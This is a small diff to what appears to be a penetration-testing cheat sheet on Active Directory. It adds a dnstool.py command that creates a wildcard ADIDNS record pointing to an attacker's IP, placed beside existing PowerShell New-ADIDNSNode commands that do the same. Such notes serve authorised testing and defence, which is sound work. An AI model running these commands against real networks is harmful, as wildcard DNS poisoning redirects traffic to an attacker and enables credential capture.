@@ -118,6 +118,10 @@ New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose
 New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose -Tombstone
 ```
 
+```
+python3 dnstool.py -u '<DOMAIN>\<USER>' -a add -r '*' -d <DC IP> <ATTACKER IP>
+```
+
 #### Give other groups permissions to the record
 - Optional
 ```
